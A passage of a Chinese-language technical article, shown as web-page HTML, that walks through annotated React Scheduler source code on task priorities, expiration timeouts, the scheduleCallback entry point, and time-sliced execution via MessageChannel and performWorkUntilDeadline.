  const priorityLevel = reactPriorityToSchedulerPriority(reactPriorityLevel);
  // 调用Scheduler的scheduleCallback，传入优先级进行调度
  return Scheduler_scheduleCallback(priorityLevel, callback, options);
}

function scheduleSyncCallback(callback: SchedulerCallback) {
  if (syncQueue === null) {
    syncQueue = [callback];
    // 以最高优先级去调度刷新syncQueue的函数
    immediateQueueCallbackNode = Scheduler_scheduleCallback(
      Scheduler_ImmediatePriority,
      flushSyncCallbackQueueImpl,
    );
  } else {
    syncQueue.push(callback);
  }
  return fakeCallbackNode;
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleCallback</span>(<span class="hljs-params">
  reactPriorityLevel: ReactPriorityLevel,
  callback: SchedulerCallback,
  options: SchedulerCallbackOptions | <span class="hljs-keyword">void</span> | <span class="hljs-literal">null</span>,
</span>) {
  <span class="hljs-comment">// 将react的优先级翻译成Scheduler的优先级</span>
  <span class="hljs-keyword">const</span> priorityLevel = <span class="hljs-title function_">reactPriorityToSchedulerPriority</span>(reactPriorityLevel);
  <span class="hljs-comment">// 调用Scheduler的scheduleCallback，传入优先级进行调度</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Scheduler</span>_scheduleCallback(priorityLevel, callback, options);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">scheduleSyncCallback</span>(<span class="hljs-params">callback: SchedulerCallback</span>) {
  <span class="hljs-keyword">if</span> (syncQueue === <span class="hljs-literal">null</span>) {
    syncQueue = [callback];
    <span class="hljs-comment">// 以最高优先级去调度刷新syncQueue的函数</span>
    immediateQueueCallbackNode = <span class="hljs-title class_">Scheduler</span>_scheduleCallback(
      <span class="hljs-title class_">Scheduler</span>_ImmediatePriority,
      flushSyncCallbackQueueImpl,
    );
  } <span class="hljs-keyword">else</span> {
    syncQueue.<span class="hljs-title function_">push</span>(callback);
  }
  <span class="hljs-keyword">return</span> fakeCallbackNode;
}</pre><h3 id="item-3-5">Scheduler中的优先级</h3><p>说到优先级，我们来看一下Scheduler自己的优先级级别，它为任务定义了以下几种级别的优先级：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="export const NoPriority = 0; // 没有任何优先级
export const ImmediatePriority = 1; // 立即执行的优先级，级别最高
export const UserBlockingPriority = 2; // 用户阻塞级别的优先级
export const NormalPriority = 3; // 正常的优先级
export const LowPriority = 4; // 较低的优先级
export const IdlePriority = 5; // 优先级最低，表示任务可以闲置
" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NoPriority</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// 没有任何优先级</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">ImmediatePriority</span> = <span class="hljs-number">1</span>; <span class="hljs-comment">// 立即执行的优先级，级别最高</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserBlockingPriority</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// 用户阻塞级别的优先级</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">NormalPriority</span> = <span class="hljs-number">3</span>; <span class="hljs-comment">// 正常的优先级</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">LowPriority</span> = <span class="hljs-number">4</span>; <span class="hljs-comment">// 较低的优先级</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">IdlePriority</span> = <span class="hljs-number">5</span>; <span class="hljs-comment">// 优先级最低，表示任务可以闲置</span>
</pre><p>任务优先级的作用已经提到过，它是计算任务过期时间的重要依据，事关过期任务在taskQueue中的排序。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="// 不同优先级对应的不同的任务过期时间间隔
var IMMEDIATE_PRIORITY_TIMEOUT = -1;
var USER_BLOCKING_PRIORITY_TIMEOUT = 250;
var NORMAL_PRIORITY_TIMEOUT = 5000;
var LOW_PRIORITY_TIMEOUT = 10000;
// Never times out
var IDLE_PRIORITY_TIMEOUT = maxSigned31BitInt;

...

// 计算过期时间（scheduleCallback函数中的内容）
var timeout;
switch (priorityLevel) {
case ImmediatePriority:
  timeout = IMMEDIATE_PRIORITY_TIMEOUT;
  break;
case UserBlockingPriority:
  timeout = USER_BLOCKING_PRIORITY_TIMEOUT;
  break;
case IdlePriority:
  timeout = IDLE_PRIORITY_TIMEOUT;
  break;
case LowPriority:
  timeout = LOW_PRIORITY_TIMEOUT;
  break;
case NormalPriority:
default:
  timeout = NORMAL_PRIORITY_TIMEOUT;
  break;
}

// startTime可暂且认为是当前时间
var expirationTime = startTime + timeout;
" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-comment">// 不同优先级对应的不同的任务过期时间间隔</span>
<span class="hljs-keyword">var</span> <span class="hljs-variable constant_">IMMEDIATE_PRIORITY_TIMEOUT</span> = -<span class="hljs-number">1</span>;
<span class="hljs-keyword">var</span> <span class="hljs-variable constant_">USER_BLOCKING_PRIORITY_TIMEOUT</span> = <span class="hljs-number">250</span>;
<span class="hljs-keyword">var</span> <span class="hljs-variable constant_">NORMAL_PRIORITY_TIMEOUT</span> = <span class="hljs-number">5000</span>;
<span class="hljs-keyword">var</span> <span class="hljs-variable constant_">LOW_PRIORITY_TIMEOUT</span> = <span class="hljs-number">10000</span>;
<span class="hljs-comment">// Never times out</span>
<span class="hljs-keyword">var</span> <span class="hljs-variable constant_">IDLE_PRIORITY_TIMEOUT</span> = maxSigned31BitInt;

...

<span class="hljs-comment">// 计算过期时间（scheduleCallback函数中的内容）</span>
<span class="hljs-keyword">var</span> timeout;
<span class="hljs-keyword">switch</span> (priorityLevel) {
<span class="hljs-keyword">case</span> <span class="hljs-title class_">ImmediatePriority</span>:
  timeout = <span class="hljs-variable constant_">IMMEDIATE_PRIORITY_TIMEOUT</span>;
  <span class="hljs-keyword">break</span>;
<span class="hljs-keyword">case</span> <span class="hljs-title class_">UserBlockingPriority</span>:
  timeout = <span class="hljs-variable constant_">USER_BLOCKING_PRIORITY_TIMEOUT</span>;
  <span class="hljs-keyword">break</span>;
<span class="hljs-keyword">case</span> <span class="hljs-title class_">IdlePriority</span>:
  timeout = <span class="hljs-variable constant_">IDLE_PRIORITY_TIMEOUT</span>;
  <span class="hljs-keyword">break</span>;
<span class="hljs-keyword">case</span> <span class="hljs-title class_">LowPriority</span>:
  timeout = <span class="hljs-variable constant_">LOW_PRIORITY_TIMEOUT</span>;
  <span class="hljs-keyword">break</span>;
<span class="hljs-keyword">case</span> <span class="hljs-title class_">NormalPriority</span>:
<span class="hljs-attr">default</span>:
  timeout = <span class="hljs-variable constant_">NORMAL_PRIORITY_TIMEOUT</span>;
  <span class="hljs-keyword">break</span>;
}

<span class="hljs-comment">// startTime可暂且认为是当前时间</span>
<span class="hljs-keyword">var</span> expirationTime = startTime + timeout;
</pre><p>可见，过期时间是任务开始时间加上timeout，而这个timeout则是通过任务优先级计算得出。</p><blockquote>React中更全面的优先级讲解在我写的这一篇文章中：<a target="_blank" href="https://segmentfault.com/a/1190000038947307">React中的优先级</a></blockquote><h3 id="item-3-6">调度入口 - scheduleCallback</h3><p>通过上面的梳理，我们知道Scheduler中的scheduleCallback是调度流程开始的关键点。在进入这个调度入口之前，我们先来认识一下Scheduler中的任务是什么形式：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="  var newTask = {
    id: taskIdCounter++,
    // 任务函数
    callback,
    // 任务优先级
    priorityLevel,
    // 任务开始的时间
    startTime,
    // 任务的过期时间
    expirationTime,
    // 在小顶堆队列中排序的依据
    sortIndex: -1,
  };" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript">  <span class="hljs-keyword">var</span> newTask = {
    <span class="hljs-attr">id</span>: taskIdCounter++,
    <span class="hljs-comment">// 任务函数</span>
    callback,
    <span class="hljs-comment">// 任务优先级</span>
    priorityLevel,
    <span class="hljs-comment">// 任务开始的时间</span>
    startTime,
    <span class="hljs-comment">// 任务的过期时间</span>
    expirationTime,
    <span class="hljs-comment">// 在小顶堆队列中排序的依据</span>
    <span class="hljs-attr">sortIndex</span>: -<span class="hljs-number">1</span>,
  };</pre><ul><li>callback：真正的任务函数，重点，也就是外部传入的任务函数，例如构建fiber树的任务函数：performConcurrentWorkOnRoot</li><li>priorityLevel：任务优先级，参与计算任务过期时间</li><li>startTime：表示任务开始的时间，影响它在timerQueue中的排序</li><li>expirationTime：表示任务何时过期，影响它在taskQueue中的排序</li><li>sortIndex：在小顶堆队列中排序的依据，在区分好任务是过期或非过期之后，sortIndex会被赋值为expirationTime或startTime，为两个小顶堆的队列（taskQueue,timerQueue）提供排序依据</li></ul><p>真正的重点是<strong>callback</strong>，作为任务函数，它的执行结果会影响到任务完成状态的判断，后面我们会讲到，暂时先无需关注。现在我们先来看看<code>scheduleCallback</code>做的事情：<strong>它负责生成调度任务、根据任务是否过期将任务放入timerQueue或taskQueue，然后触发调度行为，让任务进入调度</strong>。完整代码如下：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="function unstable_scheduleCallback(priorityLevel, callback, options) {
  // 获取当前时间，它是计算任务开始时间、过期时间和判断任务是否过期的依据
  var currentTime = getCurrentTime();
  // 确定任务开始时间
  var startTime;
  // 从options中尝试获取delay，也就是推迟时间
  if (typeof options === &#39;object&#39; &amp;&amp; options !== null) {
    var delay = options.delay;
    if (typeof delay === &#39;number&#39; &amp;&amp; delay &gt; 0) {
      // 如果有delay，那么任务开始时间就是当前时间加上delay
      startTime = currentTime + delay;
    } else {
      // 没有delay，任务开始时间就是当前时间，也就是任务需要立刻开始
      startTime = currentTime;
    }
  } else {
    startTime = currentTime;
  }

  // 计算timeout
  var timeout;
  switch (priorityLevel) {
    case ImmediatePriority:
      timeout = IMMEDIATE_PRIORITY_TIMEOUT; // -1
      break;
    case UserBlockingPriority:
      timeout = USER_BLOCKING_PRIORITY_TIMEOUT; // 250
      break;
    case IdlePriority:
      timeout = IDLE_PRIORITY_TIMEOUT; // 1073741823 ms
      break;
    case LowPriority:
      timeout = LOW_PRIORITY_TIMEOUT; // 10000
      break;
    case NormalPriority:
    default:
      timeout = NORMAL_PRIORITY_TIMEOUT; // 5000
      break;
  }
  // 计算任务的过期时间，任务开始时间 + timeout
  // 若是立即执行的优先级（ImmediatePriority），
  // 它的过期时间是startTime - 1，意味着立刻就过期
  var expirationTime = startTime + timeout;

  // 创建调度任务
  var newTask = {
    id: taskIdCounter++,
    // 真正的任务函数，重点
    callback,
    // 任务优先级
    priorityLevel,
    // 任务开始的时间，表示任务何时才能执行
    startTime,
    // 任务的过期时间
    expirationTime,
    // 在小顶堆队列中排序的依据
    sortIndex: -1,
  };

  // 下面的if...else判断各自分支的含义是：

  // 如果任务未过期，则将 newTask 放入timerQueue， 调用requestHostTimeout，
  // 目的是在timerQueue中排在最前面的任务的开始时间的时间点检查任务是否过期，
  // 过期则立刻将任务加入taskQueue，开始调度

  // 如果任务已过期，则将 newTask 放入taskQueue，调用requestHostCallback，
  // 开始调度执行taskQueue中的任务
  if (startTime &gt; currentTime) {
    // 任务未过期，以开始时间作为timerQueue排序的依据
    newTask.sortIndex = startTime;
    push(timerQueue, newTask);
    if (peek(taskQueue) === null &amp;&amp; newTask === peek(timerQueue)) {
      // 如果现在taskQueue中没有任务，并且当前的任务是timerQueue中排名最靠前的那一个
      // 那么需要检查timerQueue中有没有需要放到taskQueue中的任务，这一步通过调用
      // requestHostTimeout实现
      if (isHostTimeoutScheduled) {
        // 因为即将调度一个requestHostTimeout，所以如果之前已经调度了，那么取消掉
        cancelHostTimeout();
      } else {
        isHostTimeoutScheduled = true;
      }
      // 调用requestHostTimeout实现任务的转移，开启调度
      requestHostTimeout(handleTimeout, startTime - currentTime);
    }
  } else {
    // 任务已经过期，以过期时间作为taskQueue排序的依据
    newTask.sortIndex = expirationTime;
    push(taskQueue, newTask);

    // 开始执行任务，使用flushWork去执行taskQueue
    if (!isHostCallbackScheduled &amp;&amp; !isPerformingWork) {
      isHostCallbackScheduled = true;
      requestHostCallback(flushWork);
    }
  }

  return newTask;
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">unstable_scheduleCallback</span>(<span class="hljs-params">priorityLevel, callback, options</span>) {
  <span class="hljs-comment">// 获取当前时间，它是计算任务开始时间、过期时间和判断任务是否过期的依据</span>
  <span class="hljs-keyword">var</span> currentTime = <span class="hljs-title function_">getCurrentTime</span>();
  <span class="hljs-comment">// 确定任务开始时间</span>
  <span class="hljs-keyword">var</span> startTime;
  <span class="hljs-comment">// 从options中尝试获取delay，也就是推迟时间</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options === <span class="hljs-string">'object'</span> &amp;&amp; options !== <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">var</span> delay = options.<span class="hljs-property">delay</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> delay === <span class="hljs-string">'number'</span> &amp;&amp; delay &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-comment">// 如果有delay，那么任务开始时间就是当前时间加上delay</span>
      startTime = currentTime + delay;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 没有delay，任务开始时间就是当前时间，也就是任务需要立刻开始</span>
      startTime = currentTime;
    }
  } <span class="hljs-keyword">else</span> {
    startTime = currentTime;
  }

  <span class="hljs-comment">// 计算timeout</span>
  <span class="hljs-keyword">var</span> timeout;
  <span class="hljs-keyword">switch</span> (priorityLevel) {
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ImmediatePriority</span>:
      timeout = <span class="hljs-variable constant_">IMMEDIATE_PRIORITY_TIMEOUT</span>; <span class="hljs-comment">// -1</span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">UserBlockingPriority</span>:
      timeout = <span class="hljs-variable constant_">USER_BLOCKING_PRIORITY_TIMEOUT</span>; <span class="hljs-comment">// 250</span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">IdlePriority</span>:
      timeout = <span class="hljs-variable constant_">IDLE_PRIORITY_TIMEOUT</span>; <span class="hljs-comment">// 1073741823 ms</span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">LowPriority</span>:
      timeout = <span class="hljs-variable constant_">LOW_PRIORITY_TIMEOUT</span>; <span class="hljs-comment">// 10000</span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">NormalPriority</span>:
    <span class="hljs-attr">default</span>:
      timeout = <span class="hljs-variable constant_">NORMAL_PRIORITY_TIMEOUT</span>; <span class="hljs-comment">// 5000</span>
      <span class="hljs-keyword">break</span>;
  }
  <span class="hljs-comment">// 计算任务的过期时间，任务开始时间 + timeout</span>
  <span class="hljs-comment">// 若是立即执行的优先级（ImmediatePriority），</span>
  <span class="hljs-comment">// 它的过期时间是startTime - 1，意味着立刻就过期</span>
  <span class="hljs-keyword">var</span> expirationTime = startTime + timeout;

  <span class="hljs-comment">// 创建调度任务</span>
  <span class="hljs-keyword">var</span> newTask = {
    <span class="hljs-attr">id</span>: taskIdCounter++,
    <span class="hljs-comment">// 真正的任务函数，重点</span>
    callback,
    <span class="hljs-comment">// 任务优先级</span>
    priorityLevel,
    <span class="hljs-comment">// 任务开始的时间，表示任务何时才能执行</span>
    startTime,
    <span class="hljs-comment">// 任务的过期时间</span>
    expirationTime,
    <span class="hljs-comment">// 在小顶堆队列中排序的依据</span>
    <span class="hljs-attr">sortIndex</span>: -<span class="hljs-number">1</span>,
  };

  <span class="hljs-comment">// 下面的if...else判断各自分支的含义是：</span>

  <span class="hljs-comment">// 如果任务未过期，则将 newTask 放入timerQueue， 调用requestHostTimeout，</span>
  <span class="hljs-comment">// 目的是在timerQueue中排在最前面的任务的开始时间的时间点检查任务是否过期，</span>
  <span class="hljs-comment">// 过期则立刻将任务加入taskQueue，开始调度</span>

  <span class="hljs-comment">// 如果任务已过期，则将 newTask 放入taskQueue，调用requestHostCallback，</span>
  <span class="hljs-comment">// 开始调度执行taskQueue中的任务</span>
  <span class="hljs-keyword">if</span> (startTime &gt; currentTime) {
    <span class="hljs-comment">// 任务未过期，以开始时间作为timerQueue排序的依据</span>
    newTask.<span class="hljs-property">sortIndex</span> = startTime;
    <span class="hljs-title function_">push</span>(timerQueue, newTask);
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">peek</span>(taskQueue) === <span class="hljs-literal">null</span> &amp;&amp; newTask === <span class="hljs-title function_">peek</span>(timerQueue)) {
      <span class="hljs-comment">// 如果现在taskQueue中没有任务，并且当前的任务是timerQueue中排名最靠前的那一个</span>
      <span class="hljs-comment">// 那么需要检查timerQueue中有没有需要放到taskQueue中的任务，这一步通过调用</span>
      <span class="hljs-comment">// requestHostTimeout实现</span>
      <span class="hljs-keyword">if</span> (isHostTimeoutScheduled) {
        <span class="hljs-comment">// 因为即将调度一个requestHostTimeout，所以如果之前已经调度了，那么取消掉</span>
        <span class="hljs-title function_">cancelHostTimeout</span>();
      } <span class="hljs-keyword">else</span> {
        isHostTimeoutScheduled = <span class="hljs-literal">true</span>;
      }
      <span class="hljs-comment">// 调用requestHostTimeout实现任务的转移，开启调度</span>
      <span class="hljs-title function_">requestHostTimeout</span>(handleTimeout, startTime - currentTime);
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 任务已经过期，以过期时间作为taskQueue排序的依据</span>
    newTask.<span class="hljs-property">sortIndex</span> = expirationTime;
    <span class="hljs-title function_">push</span>(taskQueue, newTask);

    <span class="hljs-comment">// 开始执行任务，使用flushWork去执行taskQueue</span>
    <span class="hljs-keyword">if</span> (!isHostCallbackScheduled &amp;&amp; !isPerformingWork) {
      isHostCallbackScheduled = <span class="hljs-literal">true</span>;
      <span class="hljs-title function_">requestHostCallback</span>(flushWork);
    }
  }

  <span class="hljs-keyword">return</span> newTask;
}</pre><p>这个过程中的重点是任务过期与否的处理。</p><p>针对未过期任务，会放入timerQueue，并按照开始时间排列，然后调用<code>requestHostTimeout</code>，为的是等一会，等到了timerQueue中那个应该最早开始的任务（排在第一个的任务）的开始时间，再去检查它是否过期，如果它过期则放到taskQueue中，这样任务就可以被执行了，否则继续等。这个过程通过<code>handleTimeout</code>完成。</p><p><code>handleTimeout</code>的职责是：</p><ul><li>调用<code>advanceTimers</code>，检查timerQueue队列中过期的任务，放到taskQueue中。</li><li><p>检查是否已经开始调度，如尚未调度，检查taskQueue中是否已经有任务：</p><ul><li>如果有，而且现在是空闲的，说明之前的advanceTimers已经将过期任务放到了taskQueue，那么现在立即开始调度，执行任务</li><li>如果没有，而且现在是空闲的，说明之前的advanceTimers并没有检查到timerQueue中有过期任务，那么再次调用<code>requestHostTimeout</code>重复这一过程。</li></ul></li></ul><p>总之，要把timerQueue中的任务全部都转移到taskQueue中执行掉才行。</p><p>针对已过期任务，在将它放入taskQueue之后，调用<code>requestHostCallback</code>，让调度者调度一个执行者去执行任务，也就意味着调度流程开始。</p><h3 id="item-3-7">开始调度-找出调度者和执行者</h3><p>Scheduler通过调用<code>requestHostCallback</code>让任务进入调度流程，回顾上面scheduleCallback最终调用requestHostCallback执行任务的地方：</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="if (!isHostCallbackScheduled &amp;&amp; !isPerformingWork) {
  isHostCallbackScheduled = true;
  // 开始进行调度
  requestHostCallback(flushWork);
}" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript"><span class="hljs-keyword">if</span> (!isHostCallbackScheduled &amp;&amp; !isPerformingWork) {
  isHostCallbackScheduled = <span class="hljs-literal">true</span>;
  <span class="hljs-comment">// 开始进行调度</span>
  <span class="hljs-title function_">requestHostCallback</span>(flushWork);
}</pre><p>它既然把<code>flushWork</code>作为入参，那么任务的<strong>执行者</strong>本质上调用的就是<code>flushWork</code>，我们先不管执行者是如何执行任务的，先关注它是如何被调度的，需要先找出<strong>调度者</strong>，这需要看一下<code>requestHostCallback</code>的实现：</p><p>Scheduler区分了浏览器环境和非浏览器环境，为<code>requestHostCallback</code>做了两套不同的实现。在非浏览器环境下，使用setTimeout实现.</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="  requestHostCallback = function(cb) {
    if (_callback !== null) {
      setTimeout(requestHostCallback, 0, cb);
    } else {
      _callback = cb;
      setTimeout(_flushCallback, 0);
    }
  };" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript">  requestHostCallback = <span class="hljs-keyword">function</span>(<span class="hljs-params">cb</span>) {
    <span class="hljs-keyword">if</span> (_callback !== <span class="hljs-literal">null</span>) {
      <span class="hljs-built_in">setTimeout</span>(requestHostCallback, <span class="hljs-number">0</span>, cb);
    } <span class="hljs-keyword">else</span> {
      _callback = cb;
      <span class="hljs-built_in">setTimeout</span>(_flushCallback, <span class="hljs-number">0</span>);
    }
  };</pre><p>在浏览器环境，用MessageChannel实现，关于MessageChannel的<a target="_blank" href="https://link.segmentfault.com/?enc=OW7Od5q2nFUBxTd2bCZXpQ%3D%3D.Lkdo4Lx8woBHgQdCAhBVo%2Bdq2sRwPRG4CemmOMz9kbWRjLSWtD0i4EEsx%2FXAuaTqPljobRQjmyin4gq9OER7Gg%3D%3D">介绍</a>就不再赘述。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="
  const channel = new MessageChannel();
  const port = channel.port2;
  channel.port1.onmessage = performWorkUntilDeadline;


  requestHostCallback = function(callback) {
    scheduledHostCallback = callback;
    if (!isMessageLoopRunning) {
      isMessageLoopRunning = true;
      port.postMessage(null);
    }
  };
" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript">
  <span class="hljs-keyword">const</span> channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageChannel</span>();
  <span class="hljs-keyword">const</span> port = channel.<span class="hljs-property">port2</span>;
  channel.<span class="hljs-property">port1</span>.<span class="hljs-property">onmessage</span> = performWorkUntilDeadline;


  requestHostCallback = <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) {
    scheduledHostCallback = callback;
    <span class="hljs-keyword">if</span> (!isMessageLoopRunning) {
      isMessageLoopRunning = <span class="hljs-literal">true</span>;
      port.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>);
    }
  };
</pre><p>之所以有两种实现，是因为非浏览器环境不存在屏幕刷新率，没有帧的概念，也就不会有时间片，这与在浏览器环境下执行任务有本质区别，因为非浏览器环境基本不胡有用户交互，所以该场景下不判断任务执行时间是否超出了时间片限制，而浏览器环境任务的执行会有时间片的限制。除了这一点之外，虽然两种环境下实现方式不一样，但是做的事情大致相同。</p><p>先看非浏览器环境，它将入参（执行任务的函数）存储到内部的变量<code>_callback</code>上，然后调度<code>_flushCallback</code>去执行这个此变量_callback，taskQueue被清空。</p><p>再看浏览器环境，它将入参（执行任务的函数）存到内部的变量<code>scheduledHostCallback</code>上，然后通过MessageChannel的port去发送一个消息，让<code>channel.port1</code>的监听函数<code>performWorkUntilDeadline</code>得以执行。<code>performWorkUntilDeadline</code>内部会执行掉<code>scheduledHostCallback</code>，最后taskQueue被清空。</p><p>通过上面的描述，可以很清楚得找出调度者：非浏览器环境是<strong>setTimeout</strong>，浏览器环境是<strong>port.postMessage</strong>。而两个环境的执行者也显而易见，前者是<code>_flushCallback</code>，后者是<code>performWorkUntilDeadline</code>，执行者做的事情都是去调用实际的任务执行函数。</p><p>因为本文围绕Scheduler的时间片调度行为展开，所以主要探讨浏览器环境下的调度行为，performWorkUntilDeadline涉及到调用任务执行函数去执行任务，这个过程中会涉及<strong>任务的中断和恢复</strong>、<strong>任务完成状态的判断</strong>，接下来的内容将重点对这两点进行讲解。</p><h3 id="item-3-8">任务执行 - 从performWorkUntilDeadline说起</h3><p>在文章开头的原理概述中提到过<code>performWorkUntilDeadline</code>作为执行者，它的作用是按照时间片的限制去中断任务，并通知调度者再次调度一个新的执行者去继续任务。按照这种认知去看它的实现，会很清晰。</p><div class="widget-codetool" style="display: none;">
      <div class="widget-codetool--inner">
        <button type="button" class="btn btn-dark rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="  const performWorkUntilDeadline = () =&gt; {

    if (scheduledHostCallback !== null) {
      // 获取当前时间
      const currentTime = getCurrentTime();

      // 计算deadline，deadline会参与到
      // shouldYieldToHost（根据时间片去限制任务执行）的计算中
      deadline = currentTime + yieldInterval;
      // hasTimeRemaining表示任务是否还有剩余时间，
      // 它和时间片一起限制任务的执行。如果没有时间，
      // 或者任务的执行时间超出时间片限制了，那么中断任务。

      // 它的默认为true，表示一直有剩余时间
      // 因为MessageChannel的port在postMessage，
      // 是比setTimeout还靠前执行的宏任务，这意味着
      // 在这一帧开始时，总是会有剩余时间
      // 所以现在中断任务只看时间片的了
      const hasTimeRemaining = true;
      try {
        // scheduledHostCallback去执行任务的函数，
        // 当任务因为时间片被打断时，它会返回true，表示
        // 还有任务，所以会再让调度者调度一个执行者
        // 继续执行任务
        const hasMoreWork = scheduledHostCallback(
          hasTimeRemaining,
          currentTime,
        );

        if (!hasMoreWork) {
          // 如果没有任务了，停止调度
          isMessageLoopRunning = false;
          scheduledHostCallback = null;
        } else {
          // 如果还有任务，继续让调度者调度执行者，便于继续
          // 完成任务
          port.postMessage(null);
        }
      } catch (error) {
        port.postMessage(null);
        throw error;
      }
    } else {
      isMessageLoopRunning = false;
    }
    needsPaint = false;
  };" aria-label="复制" data-bs-original-title="复制">
        <i class="far fa-copy"></i>
        </button>
      </div>
      </div><pre class="javascript hljs language-javascript">  <span class="hljs-keyword">const</span> <span class="hljs-title function_">performWorkUntilDeadline</span> = (<span class="hljs-params"></span>) =&gt; {

    <span class="hljs-keyword">if</span> (scheduledHostCallback !== <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// 获取当前时间</span>
      <span class="hljs-keyword">const</span> currentTime = <span class="hljs-title function_">getCurrentTime</span>();

      <span class="hljs-comment">// 计算deadline，deadline会参与到</span>
      <span class="hljs-comment">// shouldYieldToHost（根据时间片去限制任务执行）的计算中</span>
      deadline = currentTime + yieldInterval;
      <span class="hljs-comment">// hasTimeRemaining表示任务是否还有剩余时间，</span>
      <span class="hljs-comment">// 它和时间片一起限制任务的执行。如果没有时间，</span>
      <span class="hljs-comment">// 或者任务的执行时间超出时间片限制了，那么中断任务。</span>

      <span class="hljs-comment">// 它的默认为true，表示一直有剩余时间</span>
      <span class="hljs-comment">// 因为MessageChannel的port在postMessage，</span>
      <span class="hljs-comment">// 是比setTimeout还靠前执行的宏任务，这意味着</span>
      <span class="hljs-comment">// 在这一帧开始时，总是会有剩余时间</span>
      <span class="hljs-comment">// 所以现在中断任务只看时间片的了</span>
      <span class="hljs-keyword">const</span> hasTimeRemaining = <span class="hljs-literal">true</span>;
      <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// scheduledHostCallback去执行任务的函数，</span>
        <span class="hljs-comment">// 当任务因为时间片被打断时，它会返回true，表示</span>
        <span class="hljs-comment">// 还有任务，所以会再让调度者调度一个执行者</span>
        <span class="hljs-comment">// 继续执行任务</span>
        <span class="hljs-keyword">const</span> hasMoreWork = <span class="hljs-title function_">scheduledHostCallback</span>(
          hasTimeRemaining,
          currentTime,
        );

        <span class="hljs-keyword">if</span> (!hasMoreWork) {
          <span class="hljs-comment">// 如果没有任务了，停止调度</span>
          isMessageLoopRunning = <span class="hljs-literal">false</span>;
          scheduledHostCallback = <span class="hljs-literal">null</span>;
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// 如果还有任务，继续让调度者调度执行者，便于继续</span>
          <span class="hljs-comment">// 完成任务</span>
          port.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>);
        }
      } <span class="hljs-keyword">catch</span> (error) {
        port.<span class="hljs-title function_">postMessage</span>(<span class="hljs-literal">null</span>);
        <span class="hljs-keyword">throw</span> error;
      }
    } <span class="hljs-keyword">else</span> {
      isMessageLoopRunning = <span class="hljs-literal">false</span>;
    }
    needsPaint = <span class="hljs-literal">false</span>;
